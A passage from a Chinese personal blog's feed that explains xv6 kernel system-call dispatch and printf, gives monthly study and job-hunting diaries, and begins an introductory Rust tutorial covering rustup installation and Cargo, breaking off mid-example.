class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 处理系统调用的函数的原型</span></span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_exit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_mkdir</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_close</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="type">void</span>)</span> = &#123;</span><br><span class="line">[SYS_fork]    sys_fork,</span><br><span class="line">[SYS_exit]    sys_exit,</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">[SYS_mkdir]   sys_mkdir,</span><br><span class="line">[SYS_close]   sys_close,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">syscall</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 取出系统调用号，检查对应的系统调用是否存在，不存在则打印错误</span></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    <span class="comment">// 存在则执行对应的系统调用处理函数，并把返回值存到 a0 中，后面会传递给用户进程</span></span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">            p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>syscall</code> 会根据用户进程指定的系统调用号执行指定的系统调用处理函数</p><p>最后会经过 <code>usertrapret</code>、<code>userret</code> 返回到用户进程</p><h3 id="省流小结-1"><a href="#省流小结-1" class="headerlink" title="省流小结"></a>省流小结</h3><p>ecall -&gt; <code>uservec</code> -&gt; <code>usertrap</code> -&gt; <code>syscall</code> -&gt; <code>usertrapret</code> -&gt; <code>userret</code> -&gt; ecall + 4</p><p>关键在于 <code>syscall</code> 根据系统调用号调用对应的系统调用处理函数</p><h2 id="怎么实现可变参数-printf-并输出"><a href="#怎么实现可变参数-printf-并输出" class="headerlink" title="怎么实现可变参数 printf 并输出"></a>怎么实现可变参数 printf 并输出</h2><p>这里介绍内核的 <code>printf</code>（kernel/printf.c）</p><h3 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h3><p>其实可变参数是由 C 语言库和编译器来实现的</p><p>C 语言库中给出了 <code>va_start</code>、<code>va_arg</code>、<code>va_end</code> 接口，这里只简单介绍一下，想详细了解可参考末尾的链接，不过是 x86_64 架构，原理类似</p><ul><li><code>va_list</code>：一个变量类型，variable arguments list 可变参数列表</li><li><code>va_start(v, l)</code>：初始化可变参数列表，l 为函数的第一个参数名</li><li><code>va_arg(v, type)</code>：从可变参数列表中取出一个参数，须指定参数类型</li><li><code>va_end(v)</code>：结束时释放 va_list 内存</li></ul><p>我们知道 RISC-V 前 8 个参数是放在 a0-7 寄存器中，它是怎么又从寄存器中取值又从栈中取值的</p><p>答案是编译器会将除 a0 以外的寄存器全部压到栈中，这样所有参数都是连续存储在栈中，便于取值，但是不要自己去取地址然后输出（笑），要用 C 语言库的接口</p><h3 id="输出到硬件"><a href="#输出到硬件" class="headerlink" title="输出到硬件"></a>输出到硬件</h3><p>每次输出时将一个字符传给硬件，硬件回显给控制台</p><p>内核中有 <code>consputc</code> 就是将字符传给硬件的函数，在 kernel/console.c 中</p><figure class="highlight c"><figcaption><span>kernel/console.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">consputc</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(c == BACKSPACE)&#123;</span><br><span class="line">    <span class="comment">// 如果是退格，那么就输出先退格，输出一个空格，再退格</span></span><br><span class="line">    uartputc_sync(<span class="string">&#x27;\b&#x27;</span>); uartputc_sync(<span class="string">&#x27; &#x27;</span>); uartputc_sync(<span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 否则直接输出</span></span><br><span class="line">    uartputc_sync(c);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传递给硬件寄存器具体在 kernel/uart.c 的 <code>uartputc_sync</code> 函数中</p><figure class="highlight c"><figcaption><span>kernel/uart.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">uartputc_sync</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 关闭硬件中断</span></span><br><span class="line">  push_off();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(panicked)&#123;</span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">      ;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 等待之前的字符传输完成，硬件准备接收字符</span></span><br><span class="line">  <span class="keyword">while</span>((ReadReg(LSR) &amp; LSR_TX_IDLE) == <span class="number">0</span>)</span><br><span class="line">    ;</span><br><span class="line">  <span class="comment">// 把字符写入硬件用于接收字符的寄存器中</span></span><br><span class="line">  WriteReg(THR, c);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 开启硬件中断</span></span><br><span class="line">  pop_off();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><p>接下来看看 <code>printf</code> 代码实现</p><figure class="highlight c"><figcaption><span>kernel/printf.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">printf</span><span class="params">(<span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="type">int</span> i, c, locking;</span><br><span class="line">  <span class="type">char</span> *s;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加锁</span></span><br><span class="line">  locking = pr.locking;</span><br><span class="line">  <span class="keyword">if</span>(locking)</span><br><span class="line">    acquire(&amp;pr.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fmt == <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;null fmt&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化 ap</span></span><br><span class="line">  va_start(ap, fmt);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 遍历 fmt</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; (c = fmt[i] &amp; <span class="number">0xff</span>) != <span class="number">0</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(c != <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">      consputc(c);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    c = fmt[++i] &amp; <span class="number">0xff</span>;</span><br><span class="line">    <span class="keyword">if</span>(c == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">    <span class="comment">// 如果前一个是 % 接下来根据后面的字母获取对应类型的变量</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">      printint(va_arg(ap, <span class="type">int</span>), <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">      printint(va_arg(ap, <span class="type">int</span>), <span class="number">16</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">      printptr(va_arg(ap, uint64));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span>((s = va_arg(ap, <span class="type">char</span>*)) == <span class="number">0</span>)</span><br><span class="line">        s = <span class="string">&quot;(null)&quot;</span>;</span><br><span class="line">      <span class="keyword">for</span>(; *s; s++)</span><br><span class="line">        consputc(*s);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">      consputc(<span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">// 如果是不支持的字母，则直接输出 % 和字母</span></span><br><span class="line">      consputc(<span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">      consputc(c);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 释放内存</span></span><br><span class="line">  va_end(ap);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 解锁</span></span><br><span class="line">  <span class="keyword">if</span>(locking)</span><br><span class="line">    release(&amp;pr.lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实逻辑挺简单的</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/94036267">揭秘X86架构C可变参数函数实现原理</a>：其实这篇文章所说的 x86 指的是 x86_64</p><h2 id="怎么成功创建一个进程"><a href="#怎么成功创建一个进程" class="headerlink" title="怎么成功创建一个进程"></a>怎么成功创建一个进程</h2><p>#todo</p><h2 id="怎么实现页表的创建与更新"><a href="#怎么实现页表的创建与更新" class="headerlink" title="怎么实现页表的创建与更新"></a>怎么实现页表的创建与更新</h2><p>#todo</p><h2 id="怎么实现虚拟地址映射"><a href="#怎么实现虚拟地址映射" class="headerlink" title="怎么实现虚拟地址映射"></a>怎么实现虚拟地址映射</h2><p>#todo </p><h2 id="怎么实现线程切换"><a href="#怎么实现线程切换" class="headerlink" title="怎么实现线程切换"></a>怎么实现线程切换</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;个人对 xv6 这个简易操作系统内核比较感兴趣，就想写一个剖析，看看 xv6 都是怎么实现这些功能的，坚持一周更一个话题&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>2023.05</title>
    <link href="https://humoooor.cn/2023/05/10/2023.05/"/>
    <id>https://humoooor.cn/2023/05/10/2023.05/</id>
    <published>2023-05-10T12:05:00.000Z</published>
    <updated>2023-06-02T16:04:48.320Z</updated>
    
    <content type="html"><![CDATA[<p>转好的五月（？）</p><span id="more"></span><h2 id="Week-5-2023-05-01-2023-05-07"><a href="#Week-5-2023-05-01-2023-05-07" class="headerlink" title="Week 5 (2023.05.01 - 2023.05.07)"></a>Week 5 (2023.05.01 - 2023.05.07)</h2><p>出去完回来了，剩下再玩几天</p><p>荣耀笔试过了😋，但别高兴太早</p><p>把笔试题用 Rust 过一遍，发现全是简单题 😅，wsfw</p><p>投了菁英班，以前把华子当保底，现在高攀不起 😭</p><p>🏓 被薄纱了</p><p>下周期望：</p><ol><li>Rust 继续看</li><li>开始 xv6</li></ol><h2 id="Week-6-2023-05-08-2023-05-14"><a href="#Week-6-2023-05-08-2023-05-14" class="headerlink" title="Week 6 (2023.05.08 - 2023.05.14)"></a>Week 6 (2023.05.08 - 2023.05.14)</h2><p>开始 xv6 了，一开始的 Utilities 和 System calls 还比较简单，到 Page tables 的时候因为 RISC-V 页表知识忘得差不多了，准备再去看看笔记和视频，复习一遍</p><p>荣耀一面过了😋，做了性格测试，听说会刷人，有点慌😰</p><p>Rustlings 还剩一点</p><p>下周期望：</p><ol><li>xv6 Page tables、Traps、COW</li></ol><h2 id="Week-7-2023-05-15-2023-05-21"><a href="#Week-7-2023-05-15-2023-05-21" class="headerlink" title="Week 7 (2023.05.15 - 2023.05.21)"></a>Week 7 (2023.05.15 - 2023.05.21)</h2><p>看完 Page tables，想写一个 xv6 剖析，比如系统调用的实现过程、创建一个进程的过程等等，希望不鸽</p><p><del>荣耀二面了，第一个二面的企业，感谢荣耀，solute！</del></p><p>荣耀寄了😭</p><p>准备下华子面试</p><p>最近开始学下五十音图捏</p><p>思考一下学习时间安排，感觉应该在一段时间里专心学一件事情，比如两天学 xv6，两天学 rust 这样</p><p>下周期望：</p><ol><li>xv6 Traps、COW</li><li>看一下 Go 的漏洞挖掘</li><li>看一下 glibc malloc</li></ol><h2 id="Week-8-2023-05-22-2023-05-28"><a href="#Week-8-2023-05-22-2023-05-28" class="headerlink" title="Week 8 (2023.05.22 - 2023.05.28)"></a>Week 8 (2023.05.22 - 2023.05.28)</h2><p>开了个 xv6 剖析的坑，写了点内容，有点成就感捏😋</p><p>看了会 Go 的 Pwn，发现好难 o(╥﹏╥)o，开摆了</p><p>稍微复习了下 glibc 和 musl libc 就去面试了</p><p>线下面试还要手写代码😰，判断素数，忘记遍历时把平方根带进去了（<del>应该没事吧</del>）</p><p>周六一上午把华子面完了，本来以为二面下午才开始，收拾好东西到宿舍了，收到二面已开始的通知（急急急），又赶回去面试了</p><p>一面手撕简单的找最大子串，手贱自己写了个例子没通过，面试官给的例子倒是过了（</p><p>华子你⑨⑨我吧</p><p>下周期望：</p><ol><li>各种课的 ddl</li><li>xv6 继续</li><li>是不是要开始预习期末了（？）</li></ol><h2 id="Week-9-2023-05-29-2023-05-31"><a href="#Week-9-2023-05-29-2023-05-31" class="headerlink" title="Week 9 (2023.05.29 - 2023.05.31)"></a>Week 9 (2023.05.29 - 2023.05.31)</h2><p>摆了三天，只写完了 ddl</p><p>开始投小厂</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个月又熟悉了一遍 xv6 和 RISC-V，然后完善了对应的文章，然后对 gdb 也更熟练了，之前还不知道怎么对着源码下断点</p><p>实习还是一筹莫展，急急急</p><p>下月期望</p><ul><li>准备<del>复习</del>预习期末</li><li>突破 0 offer</li><li>早睡早起</li><li>xv6 看情况继续</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;转好的五月（？）&lt;/p&gt;</summary>
    
    
    
    <category term="MonthReport" scheme="https://humoooor.cn/categories/MonthReport/"/>
    
    
  </entry>
  
  <entry>
    <title>2023.04</title>
    <link href="https://humoooor.cn/2023/04/09/2023.04/"/>
    <id>https://humoooor.cn/2023/04/09/2023.04/</id>
    <published>2023-04-09T08:00:00.000Z</published>
    <updated>2023-06-02T16:02:57.082Z</updated>
    
    <content type="html"><![CDATA[<p>心血来潮想要记录自己的学习过程，希望能坚持下去 —— 慌乱的一个月</p><span id="more"></span><h2 id="Week-1-2023-04-01-2023-04-09"><a href="#Week-1-2023-04-01-2023-04-09" class="headerlink" title="Week 1 (2023.04.01 - 2023.04.09)"></a>Week 1 (2023.04.01 - 2023.04.09)</h2><p>发现 Rust <a href="https://doc.rust-lang.org/stable/book/">圣经</a>的<a href="https://kaisery.github.io/trpl-zh-cn/">中文译本</a>，准备以此学习 Rust，其他文档作为补充</p><p>本来想着边学 Rust 边做笔记，但是发现速度有点慢，毕竟 Rust 只是训练营的前置技能（QAQ）</p><p><del>这周也忙着其他事情，放在 Rust 的时间不多</del>（都是借口！）</p><p>因此只写了两篇文章，一篇<a href="https://humoooor.cn/2023/04/04/Rust%20%E5%85%A5%E9%97%A8/">入门</a>，一篇所有权<del>（如果你看到我了，说明所有权还没有写好）</del>，以后可能只会写一些比较需要注意的点<del>（争取多写点🕊🕊🕊）</del></p><p>和群友讨论了下 enum 的特点，发现它是一个 tagged union（或许只有我不知道555），了解了它的内存布局</p><p>Rustlings 做到了 structs，要加速！</p><p>看可信计算平台的文档，调研可行性</p><p>下周期望：</p><ol><li>看完 Rust 圣经</li><li>做完 Rustlings</li><li>调研可信计算平台的可行性</li></ol><h2 id="Week-2-2023-04-10-2023-04-16"><a href="#Week-2-2023-04-10-2023-04-16" class="headerlink" title="Week 2 (2023.04.10 - 2023.04.16)"></a>Week 2 (2023.04.10 - 2023.04.16)</h2><p>果然上一周的孽，这一周加倍还</p><p>为了赶进度，草草做完了 Rustlings，圣经还没细看</p><p>经讨论发现可信计算平台短短几个月时间根本弄不完，放弃了</p><p>下周期望：</p><ol><li>看完 Rust 圣经<ul><li>一定要细看，多写写代码</li></ul></li><li>学习 RISC-V 架构<ul><li>非特权级指令</li><li>特权级指令</li><li>页表</li></ul></li></ol><h2 id="Week-3-2023-04-17-2023-04-23"><a href="#Week-3-2023-04-17-2023-04-23" class="headerlink" title="Week 3 (2023.04.17 - 2023.04.23)"></a>Week 3 (2023.04.17 - 2023.04.23)</h2><p>由于身体原因，去医院去了好几趟，真费时间啊</p><p>Rust 还没看完 🐔</p><p>就跟着 OS 课程看了一遍 RISC-V 讲义</p><p>成绩出来了，彻底放弃保研想法😭，准备找实习了😭</p><p>投了</p><ul><li>地平线的嵌入式开发，简历直接 🐔 了 😰</li><li>百度的安全工程师，笔试 🐔 了，怎么都是 Web 安全啊 😡</li><li>招行的测试（？），一面 🐔 了</li></ul><p>下周期望：</p><ol><li>继续看 Rust 圣经</li><li><del>开始 rcore</del></li></ol><h2 id="Week-4-2023-04-24-2023-04-30"><a href="#Week-4-2023-04-24-2023-04-30" class="headerlink" title="Week 4 (2023.04.24 - 2023.04.30)"></a>Week 4 (2023.04.24 - 2023.04.30)</h2><p>这周有点摆，女朋友出去玩捏 🥰</p><p>思考了一下就业方向，准备找 Linux/OS 开发</p><p>做了荣耀的 OS 开发笔试，就做了一道半 😭， 感觉有点悬</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>稀里糊涂的一个月，瞻前顾后，最后还是决定就业</p><p>下月期望</p><ol><li>看完 Rust 圣经</li><li>继续完成落下的 xv6</li><li>拿到一个实习 offer（真的可以吗）</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;心血来潮想要记录自己的学习过程，希望能坚持下去 —— 慌乱的一个月&lt;/p&gt;</summary>
    
    
    
    <category term="MonthReport" scheme="https://humoooor.cn/categories/MonthReport/"/>
    
    
  </entry>
  
  <entry>
    <title>Rust 入门</title>
    <link href="https://humoooor.cn/2023/04/04/Rust%20%E5%85%A5%E9%97%A8/"/>
    <id>https://humoooor.cn/2023/04/04/Rust%20%E5%85%A5%E9%97%A8/</id>
    <published>2023-04-04T09:58:00.000Z</published>
    <updated>2023-04-06T09:59:10.509Z</updated>
    
    <content type="html"><![CDATA[<p>仅仅介绍 Rust 的安装、Cargo、变量、数据类型、函数和控制流</p><span id="more"></span><p>环境：Ubuntu 22.04 rustc 1.68.2</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">$ curl --proto <span class="string">&#x27;=https&#x27;</span> --tlsv1.2 https://sh.rustup.rs -sSf | sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新</span></span><br><span class="line">$ rustup update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载</span></span><br><span class="line">$ rustup self uninstall</span><br></pre></td></tr></table></figure><p>安装时会下载 rustup 工具，并安装最新版 Rust 一系列工具（编译器 rustc 等）</p><p>rustup 是一个管理 Rust 版本和相关工具的命令行工具</p><h2 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world!"></a>Hello world!</h2><p>程序员传统捏~</p><figure class="highlight rust"><figcaption><span>hello.rs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 rustc hello.rs 编译</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>main</code> 函数：不用多说，程序入口</p><p><code>println!</code>：调用了一个宏（如果是调用函数，后面没有<code>!</code>）</p><p><code>&quot;Hello world!&quot;</code>：将字符串传递给 <code>println</code></p><p>分号 <code>;</code> 结尾：大部分语句都以问号结尾</p><h2 id="Cargo"><a href="#Cargo" class="headerlink" title="Cargo"></a>Cargo</h2><p>Cargo 是 Rust 的构建系统和包管理器。大多数 Rustacean 们使用 Cargo 来管理他们的 Rust 项目，因为它可以为你处理很多任务，比如构建代码、下载依赖库并编译这些库。</p><p>下面的命令会创建一个 hello_cargo 的项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cargo new hello_cargo</span><br></pre></td></tr></table></figure><p>里面有一个 <code>Cargo.toml</code> 文件，这是 Cargo 的配置文件</p><figure class="highlight toml"><figcaption><span>Cargo.toml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;hello_cargo&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br></pre></td></tr></table></figure><p><code>[package]</code>：表明下面为一个包的配置</p><p><code>[dependencies]</code>：罗列项目使用的依赖，依赖的代码包也被称为 crate</p><h3 id="构建并运行项目"><a href="#构建并运行项目" class="headerlink" title="构建并运行项目"></a>构建并运行项目</h3><p>下面的命令用于构建项目，并生成 target 文件夹和 Cargo.lock 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cargo build</span><br></pre></td></tr></table></figure><p><code>target/debug/hello_carge</code> 为编译出来的可执行文件，我们可以直接运行这个文件，也可以使用下面的命令来编译并运行项目，更加方便</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cargo run</span><br><span class="line">  Compiling hello_cargo v0.1.0 (/home/humoooor/Code/RustPractice/hello_cargo)  </span><br><span class="line">   Finished dev [unoptimized + debuginfo] target(s) <span class="keyword">in</span> 0.46s  </span><br><span class="line">    Running `target/debug/hello_cargo`  </span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure><p>下面的命令可以检查代码确保可以编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cargo check</span><br><span class="line">   Checking hello_cargo v0.1.0 (/home/humoooor/Code/RustPractice/hello_cargo)  </span><br><span class="line">   Finished dev [unoptimized + debuginfo] target(s) <span class="keyword">in</span> 0.20s</span><br></pre></td></tr></table></figure><h3 id="发布项目"><a href="#发布项目" class="headerlink" title="发布项目"></a>发布项目</h3><p>在构建时使用 <code>--release</code> 参数，来优化编译项目，并在 <code>target/release</code> 目录下生成可执行文件，启用优化编译时间更长，但是运行速度更快，没有调试信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cargo build --release</span><br><span class="line">  Compiling hello_cargo v0.1.0 (/home/humoooor/Code/RustPractice/hello_cargo)  </span><br><span class="line">   Finished release [optimized] target(s) <span class="keyword">in</span> 0.19s</span><br></pre></td></tr></table></figure><h2 id="变量和可变性"><a href="#变量和可变性" class="headerlink" title="变量和可变性"></a>变量和可变性</h2><h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [<span class="keyword">mut</span>] &#123;var_name&#125;: &#123;var_type&#125; = &#123;value&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = <span class="string">&quot;-1&quot;</span>;</span><br><span class="line"><span class="comment">// 将 x 从 &quot;-1&quot; 转换成 -1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">x</span>: <span class="type">i32</span> = x.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">except</span>(<span class="string">&quot;&quot;</span>); </span><br></pre></td></tr></table></figure><p>value_type 和 value 必须出现一个，在某些情况（如类型转换）下，两者都要出现</p><p>每次只可以定义一个变量</p><h3 id="可变性-mutable"><a href="#可变性-mutable" class="headerlink" title="可变性 mutable"></a>可变性 mutable</h3><p>在 Rust 中，变量默认是不可改变的（immutable），在声明变量时在变量名前加上 <code>mut</code> 使其具有可变性</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;dd</span><br><span class="line">    <span class="comment">// x 默认不可变，会出现编译错误</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span 